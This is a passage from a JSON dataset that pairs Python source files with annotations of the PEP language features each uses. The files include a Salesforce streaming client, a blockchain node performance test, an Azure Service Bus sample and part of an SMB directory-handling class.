                        321,
                        ".format()"
                    ],
                    [
                        345,
                        345,
                        ".format()"
                    ],
                    [
                        42,
                        42,
                        "%"
                    ]
                ]
            }
        },
        "81": {
            "file": "from collections import abc\nfrom http import HTTPStatus\nimport logging\nimport json\nimport asyncio\nfrom typing import Optional, Union, MutableMapping, AsyncIterator, Type, cast\nfrom types import TracebackType\nfrom enum import Enum, auto, unique\nfrom aiocometd import Client as CometdClient\nfrom aiocometd.exceptions import ServerError\nfrom aiocometd.typing import JsonObject, JsonLoader, JsonDumper\nfrom aiosfstream.auth import AuthenticatorBase, PasswordAuthenticator\nfrom aiosfstream.replay import ReplayOption, ReplayMarkerStorage, \\\n    MappingStorage, ConstantReplayId, ReplayMarker\nfrom aiosfstream.exceptions import translate_errors, translate_errors_context\nCOMETD_PATH = \"cometd\"\nAPI_VERSION = \"42.0\"\nLOGGER = logging.getLogger(__name__)\nReplayParameter = Union[ReplayOption,\n                        ReplayMarkerStorage,\n                        MutableMapping[str, ReplayMarker]]\n@unique\nclass ReplayMarkerStoragePolicy(Enum):\n    AUTOMATIC = auto()\n    MANUAL = auto()\nclass Client(CometdClient):\n    @translate_errors\n    def __init__(self, authenticator: AuthenticatorBase, *,\n                 replay: ReplayParameter = ReplayOption.NEW_EVENTS,\n                 replay_fallback: Optional[ReplayOption] = None,\n                 replay_storage_policy: ReplayMarkerStoragePolicy\n                 = ReplayMarkerStoragePolicy.AUTOMATIC,\n                 connection_timeout: Union[int, float] = 10.0,\n                 max_pending_count: int = 100,\n                 json_dumps: JsonDumper = json.dumps,\n                 json_loads: JsonLoader = json.loads,\n                 loop: Optional[asyncio.AbstractEventLoop] = None):\n        if not isinstance(authenticator, AuthenticatorBase):\n            raise TypeError(f\"authenticator should be an instance of \"\n                            f\"{AuthenticatorBase.__name__}.\")\n        self.replay_fallback = replay_fallback\n        replay_storage = self.create_replay_storage(replay)\n        if not isinstance(replay_storage, ReplayMarkerStorage):\n            raise TypeError(\"{!r} is not a valid type for the replay \"\n                            \"parameter.\".format(type(replay).__name__))\n        self.replay_storage: ReplayMarkerStorage = replay_storage\n        self.replay_storage_policy = replay_storage_policy\n        LOGGER.debug(\"Client created with replay storage: %r, \"\n                     \"replay fallback: %r\",\n                     self.replay_storage,\n                     self.replay_fallback)\n        authenticator.json_dumps = json_dumps\n        authenticator.json_loads = json_loads\n        super().__init__(\"\",\n                         auth=authenticator,\n                         extensions=[self.replay_storage],\n                         connection_timeout=connection_timeout,\n                         max_pending_count=max_pending_count,\n                         json_dumps=json_dumps,\n                         json_loads=json_loads,\n                         loop=loop)\n    @translate_errors\n    async def open(self) -> None:\n        authenticator = cast(AuthenticatorBase, self.auth)\n        LOGGER.debug(\"Authenticating using %r.\", authenticator)\n        await authenticator.authenticate()\n        LOGGER.info(\"Successful authentication. Instance URL: %r.\",\n                    authenticator.instance_url)\n        self.url = self.get_cometd_url(cast(str, authenticator.instance_url))\n        await super().open()\n    @translate_errors\n    async def close(self) -> None:\n        await super().close()\n    @translate_errors\n    async def subscribe(self, channel: str) -> None:\n        try:\n            await super().subscribe(channel)\n        except ServerError as error:\n            if (self.replay_fallback and self.replay_storage and\n                    error.error_code == HTTPStatus.BAD_REQUEST):\n                LOGGER.warning(\"Subscription failed with message: %r, \"\n                               \"retrying subscription with %r.\",\n                               error.error_message,\n                               self.replay_fallback)\n                self.replay_storage.replay_fallback = self.replay_fallback\n                await super().subscribe(channel)\n            else:\n                raise\n    @translate_errors\n    async def unsubscribe(self, channel: str) -> None:\n        await super().unsubscribe(channel)\n    @translate_errors\n    async def publish(self, channel: str, data: JsonObject) -> JsonObject:\n        return await super().publish(channel, data)\n    @translate_errors\n    async def receive(self) -> JsonObject:\n        response = await super().receive()\n        if self.replay_storage_policy == ReplayMarkerStoragePolicy.AUTOMATIC:\n            await self.replay_storage.extract_replay_id(response)\n        return response\n    @translate_errors\n    async def __aiter__(self) -> AsyncIterator[JsonObject]:\n        with translate_errors_context():\n            async for message in super().__aiter__():\n                yield message\n    @translate_errors\n    async def __aenter__(self) -> \"Client\":\n        return cast(\"Client\", await super().__aenter__())\n    @translate_errors\n    async def __aexit__(self, exc_type: Type[BaseException],\n                        exc_val: BaseException,\n                        exc_tb: TracebackType) -> None:\n        return await super().__aexit__(exc_type, exc_val, exc_tb)\n    @staticmethod\n    def create_replay_storage(replay_param: ReplayParameter) \\\n            -> Optional[ReplayMarkerStorage]:\n        if isinstance(replay_param, ReplayMarkerStorage):\n            return replay_param\n        if isinstance(replay_param, abc.MutableMapping):\n            return MappingStorage(replay_param)\n        if isinstance(replay_param, ReplayOption):\n            return ConstantReplayId(replay_param)\n        return None\n    @staticmethod\n    def get_cometd_url(instance_url: str) -> str:\n        return \"/\".join((instance_url, COMETD_PATH, API_VERSION))\nclass SalesforceStreamingClient(Client):\n    def __init__(self, *,  \n                 consumer_key: str, consumer_secret: str,\n                 username: str, password: str,\n                 replay: ReplayParameter = ReplayOption.NEW_EVENTS,\n                 replay_fallback: Optional[ReplayOption] = None,\n                 replay_storage_policy: ReplayMarkerStoragePolicy\n                 = ReplayMarkerStoragePolicy.AUTOMATIC,\n                 connection_timeout: Union[int, float] = 10.0,\n                 max_pending_count: int = 100, sandbox: bool = False,\n                 json_dumps: JsonDumper = json.dumps,\n                 json_loads: JsonLoader = json.loads,\n                 loop: Optional[asyncio.AbstractEventLoop] = None):\n        authenticator = PasswordAuthenticator(\n            consumer_key=consumer_key,\n            consumer_secret=consumer_secret,\n            username=username,\n            password=password,\n            sandbox=sandbox,\n            json_dumps=json_dumps,\n            json_loads=json_loads,\n        )\n        super().__init__(\n            authenticator,\n            replay=replay,\n            replay_fallback=replay_fallback,\n            replay_storage_policy=replay_storage_policy,\n            connection_timeout=connection_timeout,\n            max_pending_count=max_pending_count,\n            json_dumps=json_dumps,\n            json_loads=json_loads,\n            loop=loop\n        )",
            "patterns": {
                "pep_526": [
                    [
                        46,
                        "self.replay_storage: ReplayMarkerStorage = replay_storage"
                    ]
                ],
                "pep_567": [
                    [
                        5,
                        5,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_563": [
                    [
                        107,
                        "    async def __aenter__(self) -> \"Client\":",
                        "quoted annotation"
                    ]
                ],
                "pep_525": [
                    [
                        102,
                        105,
                        "async generator",
                        "async def __aiter__(self) -> AsyncIterator[JsonObject]:\n        with translate_errors_context():\n            async for message in super().__aiter__():\n                yield message"
                    ],
                    [
                        104,
                        105,
                        "async for",
                        "async for message in super().__aiter__():\n                yield message"
                    ]
                ],
                "pep_498v": [
                    [
                        44,
                        45,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        39,
                        "            raise TypeError(f\"authenticator should be an instance of \""
                    ]
                ]
            }
        },
        "82": {
            "file": "import asyncio\nimport dataclasses\nimport logging\nimport random\nimport time\nfrom typing import Dict\nimport pytest\nimport cProfile\nfrom shamrock.consensus.block_record import BlockRecord\nfrom shamrock.full_node.full_node_api import FullNodeAPI\nfrom shamrock.protocols import full_node_protocol as fnp\nfrom shamrock.types.condition_opcodes import ConditionOpcode\nfrom shamrock.types.condition_with_args import ConditionWithArgs\nfrom shamrock.types.unfinished_block import UnfinishedBlock\nfrom shamrock.util.clvm import int_to_bytes\nfrom shamrock.util.ints import uint64\nfrom tests.wallet_tools import WalletTool\nfrom tests.core.fixtures import empty_blockchain  \nfrom tests.connection_utils import add_dummy_connection, connect_and_get_peer\nfrom tests.core.full_node.test_coin_store import get_future_reward_coins\nfrom tests.core.node_height import node_height_at_least\nfrom tests.core.fixtures import empty_blockchain  \nfrom tests.setup_nodes import bt, setup_simulators_and_wallets, test_constants\nfrom tests.time_out_assert import time_out_assert, time_out_assert_custom_interval, time_out_messages\nlog = logging.getLogger(__name__)\nasync def get_block_path(full_node: FullNodeAPI):\n    blocks_list = [await full_node.full_node.blockchain.get_full_peak()]\n    assert blocks_list[0] is not None\n    while blocks_list[0].height != 0:\n        b = await full_node.full_node.block_store.get_full_block(blocks_list[0].prev_header_hash)\n        assert b is not None\n        blocks_list.insert(0, b)\n    return blocks_list\n@pytest.fixture(scope=\"session\")\ndef event_loop():\n    loop = asyncio.get_event_loop()\n    yield loop\n@pytest.fixture(scope=\"module\")\nasync def wallet_nodes():\n    async_gen = setup_simulators_and_wallets(1, 1, {\"MEMPOOL_BLOCK_BUFFER\": 1, \"MAX_BLOCK_COST_CLVM\": 11000000000})\n    nodes, wallets = await async_gen.__anext__()\n    full_node_1 = nodes[0]\n    server_1 = full_node_1.full_node.server\n    wallet_a = bt.get_pool_wallet_tool()\n    wallet_receiver = WalletTool(full_node_1.full_node.constants)\n    yield full_node_1, server_1, wallet_a, wallet_receiver\n    async for _ in async_gen:\n        yield _\nclass TestPerformance:\n    @pytest.mark.asyncio\n    async def test_full_block_performance(self, wallet_nodes):\n        full_node_1, server_1, wallet_a, wallet_receiver = wallet_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        full_node_1.full_node.mempool_manager.limit_factor = 1\n        wallet_ph = wallet_a.get_new_puzzlehash()\n        blocks = bt.get_consecutive_blocks(\n            10,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=wallet_ph,\n            pool_reward_puzzle_hash=wallet_ph,\n        )\n        for block in blocks:\n            await full_node_1.full_node.respond_block(fnp.RespondBlock(block))\n        start_height = (\n            full_node_1.full_node.blockchain.get_peak().height\n            if full_node_1.full_node.blockchain.get_peak() is not None\n            else -1\n        )\n        incoming_queue, node_id = await add_dummy_connection(server_1, 12312)\n        fake_peer = server_1.all_connections[node_id]\n        puzzle_hashes = []\n        for i in range(20):\n            conditions_dict: Dict = {ConditionOpcode.CREATE_COIN: []}\n            for _ in range(100):\n                receiver_puzzlehash = wallet_receiver.get_new_puzzlehash()\n                puzzle_hashes.append(receiver_puzzlehash)\n                output = ConditionWithArgs(ConditionOpcode.CREATE_COIN, [receiver_puzzlehash, int_to_bytes(100000000)])\n                conditions_dict[ConditionOpcode.CREATE_COIN].append(output)\n            spend_bundle = wallet_a.generate_signed_transaction(\n                100,\n                puzzle_hashes[0],\n                get_future_reward_coins(blocks[1 + i])[0],\n                condition_dic=conditions_dict,\n            )\n            assert spend_bundle is not None\n            respond_transaction_2 = fnp.RespondTransaction(spend_bundle)\n            await full_node_1.respond_transaction(respond_transaction_2, fake_peer)\n            blocks = bt.get_consecutive_blocks(\n                1,\n                block_list_input=blocks,\n                guarantee_transaction_block=True,\n                transaction_data=spend_bundle,\n            )\n            await full_node_1.full_node.respond_block(fnp.RespondBlock(blocks[-1]), fake_peer)\n        await time_out_assert(10, node_height_at_least, True, full_node_1, start_height + 20)\n        spend_bundles = []\n        spend_bundle_ids = []\n        for puzzle_hash in puzzle_hashes[1:]:\n            coin_record = (await full_node_1.full_node.coin_store.get_coin_records_by_puzzle_hash(True, puzzle_hash))[0]\n            receiver_puzzlehash = wallet_receiver.get_new_puzzlehash()\n            if puzzle_hash == puzzle_hashes[-1]:\n                fee = 100000000  \n            else:\n                fee = random.randint(1, 100000000)\n            spend_bundle = wallet_receiver.generate_signed_transaction(\n                uint64(500), receiver_puzzlehash, coin_record.coin, fee=fee\n            )\n            spend_bundles.append(spend_bundle)\n            spend_bundle_ids.append(spend_bundle.get_hash())\n        pr = cProfile.Profile()\n        pr.enable()\n        start = time.time()\n        num_tx: int = 0\n        for spend_bundle, spend_bundle_id in zip(spend_bundles, spend_bundle_ids):\n            log.warning(f\"Num Tx: {num_tx}\")\n            num_tx += 1\n            respond_transaction = fnp.RespondTransaction(spend_bundle)\n            await full_node_1.respond_transaction(respond_transaction, fake_peer)\n            request = fnp.RequestTransaction(spend_bundle_id)\n            req = await full_node_1.request_transaction(request)\n            if req is None:\n                break\n        log.warning(f\"Time for mempool: {time.time() - start}\")\n        pr.create_stats()\n        pr.dump_stats(\"./mempool-benchmark.pstats\")\n        peak = full_node_1.full_node.blockchain.get_peak()\n        assert peak is not None\n        curr: BlockRecord = peak\n        while not curr.is_transaction_block:\n            curr = full_node_1.full_node.blockchain.block_record(curr.prev_hash)\n        mempool_bundle = await full_node_1.full_node.mempool_manager.create_bundle_from_mempool(curr.header_hash)\n        if mempool_bundle is None:\n            spend_bundle = None\n        else:\n            spend_bundle = mempool_bundle[0]\n        current_blocks = await full_node_1.get_all_full_blocks()\n        blocks = bt.get_consecutive_blocks(\n            1,\n            transaction_data=spend_bundle,\n            block_list_input=current_blocks,\n            guarantee_transaction_block=True,\n        )\n        block = blocks[-1]\n        unfinished = UnfinishedBlock(\n            block.finished_sub_slots,\n            block.reward_chain_block.get_unfinished(),\n            block.challenge_chain_sp_proof,\n            block.reward_chain_sp_proof,\n            block.foliage,\n            block.foliage_transaction_block,\n            block.transactions_info,\n            block.transactions_generator,\n            [],\n        )\n        pr = cProfile.Profile()\n        pr.enable()\n        start = time.time()\n        res = await full_node_1.respond_unfinished_block(fnp.RespondUnfinishedBlock(unfinished), fake_peer)\n        log.warning(f\"Res: {res}\")\n        log.warning(f\"Time for unfinished: {time.time() - start}\")\n        pr.create_stats()\n        pr.dump_stats(\"./unfinished-benchmark.pstats\")\n        pr = cProfile.Profile()\n        pr.enable()\n        start = time.time()\n        block_small = dataclasses.replace(block, transactions_generator=None)\n        res = await full_node_1.full_node.respond_block(fnp.RespondBlock(block_small))\n        log.warning(f\"Res: {res}\")\n        log.warning(f\"Time for full block: {time.time() - start}\")\n        pr.create_stats()\n        pr.dump_stats(\"./full-block-benchmark.pstats\")",
            "patterns": {
                "pep_526": [
                    [
                        114,
                        "num_tx: int = 0"
                    ],
                    [
                        129,
                        "curr: BlockRecord = peak"
                    ],
                    [
                        74,
                        "conditions_dict: Dict = {ConditionOpcode.CREATE_COIN: []}"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        6,
                        "from typing import Dict",
                        "suggestion"
                    ]
                ],
                "pep_525": [
                    [
                        39,
                        48,
                        "async generator",
                        "async def wallet_nodes():\n    async_gen = setup_simulators_and_wallets(1, 1, {\"MEMPOOL_BLOCK_BUFFER\": 1, \"MAX_BLOCK_COST_CLVM\": 11000000000})\n    nodes, wallets = await async_gen.__anext__()\n    full_node_1 = nodes[0]\n    server_1 = full_node_1.full_node.server\n    wallet_a = bt.get_pool_wallet_tool()\n    wallet_receiver = WalletTool(full_node_1.full_node.constants)\n    yield full_node_1, server_1, wallet_a, wallet_receiver\n    async for _ in async_gen:\n        yield _"
                    ],
                    [
                        47,
                        48,
                        "async for",
                        "async for _ in async_gen:\n        yield _"
                    ]
                ],
                "pep_498": [
                    [
                        124,
                        "        log.warning(f\"Time for mempool: {time.time() - start}\")"
                    ],
                    [
                        160,
                        "        log.warning(f\"Res: {res}\")"
                    ],
                    [
                        161,
                        "        log.warning(f\"Time for unfinished: {time.time() - start}\")"
                    ],
                    [
                        169,
                        "        log.warning(f\"Res: {res}\")"
                    ],
                    [
                        170,
                        "        log.warning(f\"Time for full block: {time.time() - start}\")"
                    ],
                    [
                        116,
                        "            log.warning(f\"Num Tx: {num_tx}\")"
                    ]
                ]
            }
        },
        "83": {
            "file": "import asyncio\nimport conftest\nfrom azure.servicebus.aio import ServiceBusClient, Message\nfrom azure.servicebus.common.constants import ReceiveSettleMode\nasync def sample_queue_send_receive_batch_async(sb_config, queue):\n    client = ServiceBusClient(\n        service_namespace=sb_config['hostname'],\n        shared_access_key_name=sb_config['key_name'],\n        shared_access_key_value=sb_config['access_key'],\n        debug=True)\n    queue_client = client.get_queue(queue)\n    async with queue_client.get_sender() as sender:\n        for i in range(100):\n            message = Message(\"Sample message no. {}\".format(i))\n            await sender.send(message)\n        await sender.send(Message(\"shutdown\"))\n    async with queue_client.get_receiver(idle_timeout=1, mode=ReceiveSettleMode.PeekLock, prefetch=10) as receiver:\n        batch = await receiver.fetch_next(max_batch_size=10)\n        await asyncio.gather(*[m.complete() for m in batch])\n        async for message in receiver:\n            print(\"Message: {}\".format(message))\n            print(\"Sequence number: {}\".format(message.sequence_number))\n            await message.complete()\nif __name__ == '__main__':\n    live_config = conftest.get_live_servicebus_config()\n    queue_name = conftest.create_standard_queue(live_config)\n    loop = asyncio.get_event_loop()\n    try:\n        loop.run_until_complete(sample_queue_send_receive_batch_async(live_config, queue_name))\n    finally:\n        conftest.cleanup_queue(live_config, queue_name)",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        20,
                        23,
                        "async for",
                        "async for message in receiver:\n            print(\"Message: {}\".format(message))\n            print(\"Sequence number: {}\".format(message.sequence_number))\n            await message.complete()"
                    ]
                ],
                "pep_498v": [
                    [
                        14,
                        14,
                        ".format()"
                    ],
                    [
                        21,
                        21,
                        ".format()"
                    ],
                    [
                        22,
                        22,
                        ".format()"
                    ]
                ]
            }
        },
        "84": {
            "file": "from typing import Dict, List\nimport asyncio\nimport datetime\nfrom contextlib import asynccontextmanager\nfrom pathlib import PureWindowsPath\nfrom aiosmb.commons.interfaces.file import SMBFile\nfrom aiosmb.wintypes.access_mask import *\nfrom aiosmb.wintypes.fscc.FileAttributes import FileAttributes\nfrom aiosmb.wintypes.fscc.structures.fileinfoclass import FileInfoClass\nfrom aiosmb.protocol.smb2.commands.query_info import SecurityInfo\nfrom aiosmb.protocol.smb2.commands import *\nfrom aiosmb.connection import SMBConnection\nfrom aiosmb.commons.connection.target import SMBTarget\nclass SMBDirectory:\n\tdef __init__(self):\n\t\tself.tree_id:int = None \n\t\tself.fullpath:str = None\n\t\tself.unc_path:str = None\n\t\tself.parent_dir = None\n\t\tself.name:str = None\n\t\tself.creation_time:datetime.datetime = None\n\t\tself.last_access_time:datetime.datetime = None\n\t\tself.last_write_time:datetime.datetime = None\n\t\tself.change_time:datetime.datetime = None\n\t\tself.allocation_size:datetime.datetime = None\n\t\tself.attributes:FileAttributes = None\n\t\tself.file_id:int = None\n\t\tself.security_descriptor = None\n\t\tself.files:Dict[str, SMBFile] = {}\n\t\tself.subdirs:Dict[str, SMBDirectory] = {}\n\t@staticmethod\n\tdef from_uncpath(unc_path:str):\n\t\tunc = PureWindowsPath(unc_path)\n\t\tf = SMBDirectory()\n\t\tf.share_path = unc.drive\n\t\tf.fullpath = '\\\\'.join(unc.parts[1:])\n\t\tf.unc_path = unc_path\n\t\treturn f\n\t@staticmethod\n\tdef from_smbtarget(target:SMBTarget):\n\t\tif target.path is None:\n\t\t\treturn None\n\t\tfpath = target.path.replace('/','\\\\')\n\t\ttemp = '\\\\\\\\%s%s'\n\t\tunc = temp % (target.get_hostname_or_ip(), fpath)\n\t\treturn SMBDirectory.from_uncpath(unc)\n\t@staticmethod\n\tdef from_remotepath(connection:SMBConnection, remotepath:str):\n\t\ttemp = '\\\\\\\\%s\\\\%s'\n\t\tif remotepath[0] == '\\\\':\n\t\t\ttemp = '\\\\\\\\%s%s'\n\t\tunc = temp % (connection.target.get_hostname_or_ip(), remotepath)\n\t\treturn SMBDirectory.from_uncpath(unc)\n\t@staticmethod\n\tasync def delete_unc(connection:SMBConnection, remotepath:str):\n\t\ttry:\n\t\t\tremfile = SMBDirectory.from_uncpath(remotepath)\n\t\t\ttree_entry, err = await connection.tree_connect(remfile.share_path)\n\t\t\tif err is not None:\n\t\t\t\traise err\n\t\t\ttree_id = tree_entry.tree_id\n\t\t\tdesired_access = FileAccessMask.DELETE | FileAccessMask.FILE_READ_ATTRIBUTES\n\t\t\tshare_mode = ShareAccess.FILE_SHARE_DELETE\n\t\t\tcreate_options = CreateOptions.FILE_DIRECTORY_FILE | CreateOptions.FILE_DELETE_ON_CLOSE \n\t\t\tcreate_disposition = CreateDisposition.FILE_OPEN\n\t\t\tfile_attrs = 0\n\t\t\tfile_id, err = await connection.create(tree_id, remfile.fullpath, desired_access, share_mode, create_options, create_disposition, file_attrs, return_reply = False)\n\t\t\tif err is not None:\n\t\t\t\traise err\n\t\t\tif file_id is not None:\n\t\t\t\tawait connection.close(tree_id, file_id)\n\t\t\tawait connection.tree_disconnect(tree_id)\n\t\t\treturn True, None\n\t\texcept Exception as e:\n\t\t\treturn False, e\n\t@staticmethod\n\tasync def create_remote(connection:SMBConnection, remotepath:str):\n\t\ttry:\n\t\t\tremfile = SMBDirectory.from_remotepath(connection, remotepath)\n\t\t\ttree_entry, err = await connection.tree_connect(remfile.share_path)\n\t\t\tif err is not None:\n\t\t\t\traise err\n\t\t\ttree_id = tree_entry.tree_id\n\t\t\tdesired_access = FileAccessMask.FILE_READ_DATA | FileAccessMask.FILE_WRITE_DATA | FileAccessMask.FILE_READ_EA | FileAccessMask.FILE_WRITE_EA | FileAccessMask.FILE_READ_ATTRIBUTES | FileAccessMask.FILE_WRITE_ATTRIBUTES | FileAccessMask.READ_CONTROL | FileAccessMask.DELETE | FileAccessMask.SYNCHRONIZE\n\t\t\tshare_mode = ShareAccess.FILE_SHARE_READ | ShareAccess.FILE_SHARE_WRITE | ShareAccess.FILE_SHARE_DELETE\n\t\t\tcreate_options = CreateOptions.FILE_DIRECTORY_FILE | CreateOptions.FILE_SYNCHRONOUS_IO_NONALERT\n\t\t\tcreate_disposition = CreateDisposition.FILE_CREATE\n\t\t\tfile_attrs = 0\n\t\t\tfile_id, err = await connection.create(tree_id, remfile.fullpath, desired_access, share_mode, create_options, create_disposition, file_attrs, return_reply = False)\n\t\t\tif err is not None:\n\t\t\t\traise err\n\t\t\tif file_id is not None:\n\t\t\t\tawait connection.close(tree_id, file_id)\n\t\t\tawait connection.tree_disconnect(tree_id)\n\t\t\treturn True, None\n\t\texcept Exception as e:\n\t\t\treturn False, e\n\tdef get_share_path(self):\n\t\tunc = PureWindowsPath(self.unc_path)\n\t\treturn unc.drive\n\tdef get_subdir_paths(self, fullpath:bool = False):\n\t\tpaths = []\n\t\tfor f in self.subdirs.values():\n\t\t\tif fullpath is True:\n\t\t\t\tpaths.append(f.unc_path)\n\t\t\telse:\n\t\t\t\tpaths.append(f.fullpath)\n\t\treturn paths\n\tdef get_file_paths(self, fullpath:bool = False):\n\t\tpaths = []\n\t\tfor f in self.files.values():\n\t\t\tif fullpath is True:\n\t\t\t\tpaths.append(f.unc_path)\n\t\t\telse:\n\t\t\t\tpaths.append(f.fullpath)\n\t\treturn paths\n\tasync def delete(self, connection:SMBConnection):\n\t\ttry:\n\t\t\tif self.file_id is not None:\n\t\t\t\tawait connection.close(self.tree_id, self.file_id)\n\t\t\treturn await SMBDirectory.delete_unc(connection, self.unc_path)\n\t\texcept Exception as e:\n\t\t\treturn False, e\n\tasync def get_security_descriptor(self, connection:SMBConnection):\n\t\tif self.security_descriptor is None:\n\t\t\tfile_id = None\n\t\t\ttry:\n\t\t\t\ttree_id = self.tree_id\n\t\t\t\tif self.tree_id is None:\n\t\t\t\t\ttree_entry, err = await connection.tree_connect(self.share_path)\n\t\t\t\t\tif err is not None:\n\t\t\t\t\t\traise err\n\t\t\t\t\ttree_id = tree_entry.tree_id\n\t\t\t\tdesired_access = FileAccessMask.READ_CONTROL\n\t\t\t\tshare_mode = ShareAccess.FILE_SHARE_READ\n\t\t\t\tcreate_options = CreateOptions.FILE_DIRECTORY_FILE | CreateOptions.FILE_SYNCHRONOUS_IO_NONALERT\n\t\t\t\tfile_attrs = 0\n\t\t\t\tcreate_disposition = CreateDisposition.FILE_OPEN\n\t\t\t\tfile_id, err = await connection.create(tree_id, self.fullpath, desired_access, share_mode, create_options, create_disposition, file_attrs)\n\t\t\t\tif err is not None:\n\t\t\t\t\traise err\n\t\t\t\tself.security_descriptor, err = await connection.query_info(\n\t\t\t\t\ttree_id, \n\t\t\t\t\tfile_id,\n\t\t\t\t\tinfo_type = QueryInfoType.SECURITY, \n\t\t\t\t\tinformation_class = FileInfoClass.NONE, \n\t\t\t\t\tadditional_information = SecurityInfo.ATTRIBUTE_SECURITY_INFORMATION | SecurityInfo.DACL_SECURITY_INFORMATION | SecurityInfo.OWNER_SECURITY_INFORMATION | SecurityInfo.GROUP_SECURITY_INFORMATION, \n\t\t\t\t\tflags = 0, \n\t\t\t\t)\n\t\t\t\tif err is not None:\n\t\t\t\t\traise err\n\t\t\texcept Exception as e:\n\t\t\t\treturn None, e\n\t\t\tfinally:\n\t\t\t\tif file_id is not None:\n\t\t\t\t\tawait connection.close(tree_id, file_id)\n\t\t\t\tif tree_id is not None and self.tree_id is None:\n\t\t\t\t\tawait connection.tree_disconnect(tree_id)\n\t\treturn self.security_descriptor, None\n\tdef get_console_output(self):\n\t\tlines = []\n\t\tfor name in self.subdirs:\n\t\t\tdirectory = self.subdirs[name]\n\t\t\tentry = '%s\\t%s\\t%s\\t%s' % ('drw-rw-rw-',  directory.allocation_size, directory.creation_time, directory.name)\n\t\t\tlines.append(entry)\n\t\tfor name in self.files:\n\t\t\tdirectory = self.files[name]\n\t\t\tentry = '%s\\t%s\\t%s\\t%s' % (' rw-rw-rw-',  directory.allocation_size, directory.creation_time, directory.name)\n\t\t\tlines.append(entry)\n\t\treturn lines\n\tasync def create_subdir(self, dir_name:str, connection:SMBConnection):\n\t\ttry:\n\t\t\tshould_close = False \n\t\t\tif not self.tree_id:\n\t\t\t\tshould_close = True\n\t\t\t\ttree_entry, err = await connection.tree_connect(self.get_share_path())\n\t\t\t\tif err is not None:\n\t\t\t\t\traise err\n\t\t\t\tself.tree_id = tree_entry.tree_id\n\t\t\tfile_id = None\n\t\t\tnewpath = dir_name\n\t\t\tif self.fullpath != '':\n\t\t\t\tnewpath = '%s\\\\%s' % (self.fullpath, dir_name)\n\t\t\ttry:\n\t\t\t\tfile_id, err = await connection.create(\n\t\t\t\t\tself.tree_id, \n\t\t\t\t\tnewpath, \n\t\t\t\t\tFileAccessMask.FILE_READ_DATA | FileAccessMask.FILE_WRITE_DATA | FileAccessMask.FILE_READ_EA | FileAccessMask.FILE_WRITE_EA | FileAccessMask.FILE_READ_ATTRIBUTES | FileAccessMask.FILE_WRITE_ATTRIBUTES | FileAccessMask.READ_CONTROL | FileAccessMask.DELETE | FileAccessMask.SYNCHRONIZE, \n\t\t\t\t\tShareAccess.FILE_SHARE_READ | ShareAccess.FILE_SHARE_WRITE | ShareAccess.FILE_SHARE_DELETE,\n\t\t\t\t\tCreateOptions.FILE_DIRECTORY_FILE | CreateOptions.FILE_SYNCHRONOUS_IO_NONALERT, \n\t\t\t\t\tCreateDisposition.FILE_CREATE, \n\t\t\t\t\t0\n\t\t\t\t)\n\t\t\t\tif err is not None:\n\t\t\t\t\traise err\n\t\t\t\treturn True, None\n\t\t\tfinally:\n\t\t\t\tif file_id is not None:\n\t\t\t\t\tawait connection.close(self.tree_id, file_id)\n\t\t\t\tif should_close is True:       \n\t\t\t\t\tawait connection.tree_disconnect(self.tree_id)\n\t\texcept Exception as e:\n\t\t\treturn False, e\n\tasync def delete_subdir(self, dir_name:str):\n\t\traise Exception('delete subdir not implemented!')\n\tasync def list_r(self, connection:SMBConnection, depth:int = 3, maxentries:int = None, fetch_dir_sd:bool = False, fetch_file_sd:bool = False, exclude_dir:List[str] = [], filter_cb=None):\n\t\tif depth == 0:\n\t\t\treturn\n\t\tdepth -= 1\n\t\tctr = 0\n\t\ttry:\n\t\t\tasync for obj, otype, err in self.list_gen(connection):\n\t\t\t\tawait asyncio.sleep(0)\n\t\t\t\tif otype == 'dir' and fetch_dir_sd is True and obj.name not in exclude_dir:\n\t\t\t\t\tobj.tree_id = self.tree_id\n\t\t\t\t\t_, err = await obj.get_security_descriptor(connection)\n\t\t\t\tif otype == 'file' and fetch_file_sd is True:\n\t\t\t\t\tobj.tree_id = self.tree_id\n\t\t\t\t\t_, err = await obj.get_security_descriptor(connection)\n\t\t\t\tyield obj, otype, err\n\t\t\t\tctr += 1\n\t\t\t\tif err is not None:\n\t\t\t\t\tbreak\n\t\t\t\tif ctr == maxentries:\n\t\t\t\t\tyield self, 'maxed', None\n\t\t\t\t\tbreak\n\t\t\t\tif otype == 'dir' and obj.name not in exclude_dir:\n\t\t\t\t\tif filter_cb is not None:\n\t\t\t\t\t\tres = await filter_cb('dir', obj)\n\t\t\t\t\t\tif res is False:\n\t\t\t\t\t\t\tcontinue\n\t\t\t\t\tobj.tree_id = self.tree_id\n\t\t\t\t\tasync for e,t,err in obj.list_r(connection, depth, maxentries = maxentries, exclude_dir = exclude_dir):\n\t\t\t\t\t\tyield e,t,err\n\t\texcept Exception as e:\n\t\t\tyield None, None, e\n\tasync def list_gen(self, connection:SMBConnection):\n\t\tself.files = {}\n\t\tself.subdirs = {}\n\t\tdesired_access = FileAccessMask.FILE_READ_DATA\n\t\tshare_mode = ShareAccess.FILE_SHARE_READ\n\t\tcreate_options = CreateOptions.FILE_DIRECTORY_FILE | CreateOptions.FILE_SYNCHRONOUS_IO_NONALERT\n\t\tfile_attrs = 0\n\t\tcreate_disposition = CreateDisposition.FILE_OPEN\n\t\tif not self.tree_id:\n\t\t\ttree_entry, err = await connection.tree_connect(self.get_share_path())\n\t\t\tif err is not None:\n\t\t\t\tyield self, 'dir', err\n\t\t\t\treturn\n\t\t\tself.tree_id = tree_entry.tree_id\n\t\tfile_id, err = await connection.create(self.tree_id, self.fullpath, desired_access, share_mode, create_options, create_disposition, file_attrs)\n\t\tif err is not None:\n\t\t\tyield self, 'dir', err\n\t\t\treturn\n\t\ttry:\n\t\t\twhile True:\n\t\t\t\tawait asyncio.sleep(0)\n\t\t\t\tfileinfos, err = await connection.query_directory(self.tree_id, file_id)\n\t\t\t\tif err is not None:\n\t\t\t\t\traise err\n\t\t\t\tif not fileinfos:\n\t\t\t\t\tbreak\n\t\t\t\tfor info in fileinfos:\n\t\t\t\t\tif info.FileAttributes & 